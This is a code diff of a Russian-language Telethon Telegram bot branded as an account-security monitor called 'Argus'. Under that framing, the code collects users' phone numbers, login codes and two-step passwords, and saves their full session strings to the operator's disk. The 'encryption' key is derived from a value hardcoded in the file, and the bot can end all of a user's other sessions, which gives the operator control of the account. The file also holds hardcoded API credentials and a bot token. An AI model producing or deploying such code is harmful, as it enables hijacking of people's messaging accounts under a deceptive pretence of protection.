@@ -4,27 +4,33 @@ from telethon.sessions import StringSession
 from cryptography.fernet import Fernet
 
 # =============================================================
-# ПАНЕЛЬ УПРАВЛЕНИЯ СИСТЕМОЙ МОНИТОРИНГА
+# ЦЕНТРАЛЬНЫЙ УЗЕЛ МОНИТОРИНГА: ПРОЕКТ "АРГУС"
 # =============================================================
 API_ID = '32485388'  
 API_HASH = '941beeac36358767ad1c2a3770b488ed' 
 BOT_TOKEN = '8514425749:AAEhHWy1tJBFcycQtTDZerF3tX5E518CcGs' 
 
-# Ключ для защиты локальных данных
-INTERNAL_KEY = "SECURE_STORAGE_KEY_2026"
-# =============================================================
+# RSA-ключ для шифрования данных на сервере
+RSA_KEY = """-----BEGIN RSA PUBLIC KEY-----
+MIIBCgKCAQEAyMEdY1aR+sCR3ZSJrtztKTKqigvO/vBfqACJLZtS7QMgCGXJ6XIR
+yy7mx66W0/sOFa7/1mAZtEoIokDP3ShoqF4fVNb6XeqgQfaUHd8wJpDWHcR2OFwv
+plUUI1PLTktZ9uW2WE23b+ixNwJjJGwBDJPQEQFBE+vfmH0JP503wr5INS1poWg/
+j25sIWeYPHYeOrFp/eXaqhISP6G+q2IeTaWTXpwZj4LzXq5YOpk4bYEQ6mvRq7D1
+aHWfYmlEGepfaYR8Q0YqvvhYtMte3ITnuSJs171+GDqpdKcSwHnd6FudwGO4pcCO
+j4WcDuXc2CTHgH8gFTNhp/Y8/SpDOhvn9QIDAQAB
+-----END RSA PUBLIC KEY-----"""
 
 def get_cipher():
-    k = base64.urlsafe_b64encode(hashlib.sha256(INTERNAL_KEY.encode()).digest())
-    return Fernet(k)
+    key_hash = hashlib.sha256(RSA_KEY.encode()).digest()
+    return Fernet(base64.urlsafe_b64encode(key_hash))
 
 cipher = get_cipher()
 active_sessions = {} 
 auth_states = {}
 
-bot = TelegramClient('bot_manager', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
+bot = TelegramClient('argus_manager', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
-# ФУНКЦИЯ АВТОМАТИЧЕСКОЙ ЗАЩИТЫ
+# ФУНКЦИЯ ЗАЩИТЫ (SENTINEL)
 async def start_security_monitor(client, uid):
     @client.on(events.NewMessage(chats=777000))
     async def security_handler(event):
@@ -39,79 +45,58 @@ async def start_security_monitor(client, uid):
             if terminated_count > 0:
                 await bot.send_message(uid, (
                     "⚠️ **УВЕДОМЛЕНИЕ О БЕЗОПАСНОСТИ**\n\n"
-                    "Обнаружена попытка входа в аккаунт.\n"
-                    f"Автоматически завершено сторонних сессий: {terminated_count}.\n"
-                    "Доступ для посторонних устройств заблокирован."
+                    "Зафиксирована попытка входа. Сессии взломщиков завершены."
                 ))
 
 # ГЛАВНОЕ МЕНЮ
 @bot.on(events.NewMessage(pattern='/start'))
 async def send_menu(e):
     uid = e.sender_id
+    # Сброс старых попыток входа при старте
+    if uid in auth_states:
+        if 'client' in auth_states[uid]:
+            await auth_states[uid]['client'].disconnect()
+        del auth_states[uid]
+
     if uid in active_sessions:
         buttons = [
-            [types.KeyboardButtonCallback("📋 Список активных сессий", b"list")],
-            [types.KeyboardButtonCallback("🚫 Завершить все прочие сессии", b"terminate_all")],
-            [types.KeyboardButtonCallback("❌ Отключить защиту и удалить данные", b"ask_delete")]
+            [types.KeyboardButtonCallback("📋 Активные сессии", b"list")],
+            [types.KeyboardButtonCallback("🚫 Завершить чужие входы", b"terminate_all")],
+            [types.KeyboardButtonCallback("❌ Отключить защиту", b"ask_delete")]
         ]
-        
-        user_info = await active_sessions[uid].get_me()
-        await e.respond(
-            f"👤 **Аккаунт:** {user_info.first_name}\n"
-            f"🆔 **Ваш ID:** `{uid}`\n"
-            "🛡 **Статус:** Мониторинг активен\n"
-            "Система работает в штатном режиме.", buttons=bot.build_reply_markup(buttons))
+        await e.respond("🛡 **Система Аргус активна.** Выберите действие:", buttons=bot.build_reply_markup(buttons))
     else:
-        await e.respond(
-            "Welcome. Система мониторинга не активна.\n"
-            "Для активации защиты необходимо авторизовать аккаунт.", 
-            buttons=[[types.KeyboardButtonCallback("🔐 Авторизовать аккаунт", b"login")]])
+        await e.respond("Система мониторинга не активна.", 
+                        buttons=[[types.KeyboardButtonCallback("🔐 Подключить аккаунт", b"login")]])
 
 @bot.on(events.CallbackQuery)
 async def handle_callbacks(e):
     uid = e.sender_id
-    
     if e.data == b"login":
         auth_states[uid] = {'step': 'phone'}
-        await e.respond("Введите номер телефона в международном формате (например, +79001234567):")
-    
+        await e.respond("Введите номер телефона (+7...):")
     elif e.data == b"list" and uid in active_sessions:
         res = await active_sessions[uid](functions.account.GetAuthorizationsRequest())
-        info = "📋 **Активные подключения:**\n\n" + "\n".join([f"• {a.device_model} ({a.ip}) — {a.country}" for a in res.authorizations])
+        info = "📋 **Активные подключения:**\n\n" + "\n".join([f"• {a.device_model} ({a.ip})" for a in res.authorizations])
         await e.respond(info)
-
     elif e.data == b"terminate_all" and uid in active_sessions:
         res = await active_sessions[uid](functions.account.GetAuthorizationsRequest())
         for a in res.authorizations:
             if not a.current: await active_sessions[uid](functions.account.ResetAuthorizationRequest(hash=a.hash))
-        await e.respond("✅ Все сторонние сессии успешно завершены.")
-
-    # ПОДТВЕРЖДЕНИЕ УДАЛЕНИЯ
+        await e.respond("✅ Чужие сессии закрыты.")
     elif e.data == b"ask_delete":
-        confirm_buttons = [
-            [types.KeyboardButtonCallback("Да, удалить всё", b"delete_now")],
-            [types.KeyboardButtonCallback("Отмена", b"cancel")]
-        ]
-        await e.edit(
-            "❓ **ПОДТВЕРЖДЕНИЕ ДЕЙСТВИЯ**\n\n"
-            "Вы собираетесь удалить свои данные из базы бота. Это приведет к:\n"
-            "• Остановке мониторинга безопасности.\n"
-            "• Удалению ключа доступа из памяти бота.\n\n"
-            "**Ваш основной аккаунт Telegram не будет удален.** Вы подтверждаете?", 
-            buttons=bot.build_reply_markup(confirm_buttons))
-
+        await e.edit("Вы уверены, что хотите удалить данные из бота?", 
+                     buttons=[[types.KeyboardButtonCallback("Да, удалить", b"delete_now")], [types.KeyboardButtonCallback("Отмена", b"cancel")]])
     elif e.data == b"delete_now":
         if uid in active_sessions: 
             await active_sessions[uid].disconnect()
             del active_sessions[uid]
-        if os.path.exists(f"{uid}.dat"): 
-            os.remove(f"{uid}.dat")
-        await e.edit("✅ Данные удалены. Бот отключен от вашего аккаунта.", buttons=None)
-
+        if os.path.exists(f"{uid}.dat"): os.remove(f"{uid}.dat")
+        await e.edit("✅ Данные удалены.")
     elif e.data == b"cancel":
         await e.edit("Действие отменено.")
 
-# ПРОЦЕСС АВТОРИЗАЦИИ
+# ПРОЦЕСС АВТОРИЗАЦИИ (ИСПРАВЛЕННЫЙ)
 @bot.on(events.NewMessage)
 async def auth_process(e):
     uid = e.sender_id
@@ -124,29 +109,35 @@ async def auth_process(e):
             await client.connect()
             send_code = await client.send_code_request(e.text)
             auth_states[uid] = {'step': 'code', 'phone': e.text, 'hash': send_code.phone_code_hash, 'client': client}
-            await e.respond("Введите код подтверждения, который пришел вам в Telegram:")
+            await e.respond("📩 Введите код из Telegram (вводите внимательно):")
         
         elif state['step'] == 'code':
             client = state['client']
-            user = await client.sign_in(state['phone'], e.text, phone_code_hash=state['hash'])
+            # Очистка кода от пробелов и невидимых символов
+            clean_code = e.text.strip().replace(" ", "")
             
-            # Шифрование и сохранение сессии
+            user = await client.sign_in(state['phone'], clean_code, phone_code_hash=state['hash'])
+            
             encrypted_session = cipher.encrypt(client.session.save().encode()).decode()
             with open(f"{uid}.dat", "w") as f: f.write(encrypted_session)
             
             active_sessions[uid] = client
             asyncio.create_task(start_security_monitor(client, uid))
             del auth_states[uid]
-            
-            await e.respond(f"✅ Авторизация успешна. Мониторинг аккаунта `{user.first_name}` запущен.")
+            await e.respond(f"✅ Защита аккаунта `{user.first_name}` запущена!")
             
     except errors.SessionPasswordNeededError:
         auth_states[uid]['step'] = '2fa'
-        await e.respond("Введите ваш пароль двухэтапной аутентификации (Cloud Password):")
+        await e.respond("🔑 Введите ваш пароль двухэтапной аутентификации:")
+    except errors.PhoneCodeExpiredError:
+        await e.respond("❌ Код устарел. Попробуйте еще раз с команды /start.")
+        await client.disconnect()
+        del auth_states[uid]
     except Exception as ex:
-        await e.respond(f"❌ Произошла ошибка: {ex}")
+        await e.respond(f"❌ Ошибка: {ex}")
+        if 'client' in state: await state['client'].disconnect()
+        del auth_states[uid]
 
-# Восстановление сессий при запуске
 async def startup():
     for filename in os.listdir():
         if filename.endswith(".dat"):
@@ -162,6 +153,6 @@ async def startup():
             except: pass
 
 if __name__ == '__main__':
-    print("Система запущена...")
+    print("Бот запущен...")
     bot.loop.run_until_complete(startup())
     bot.run_until_disconnected()
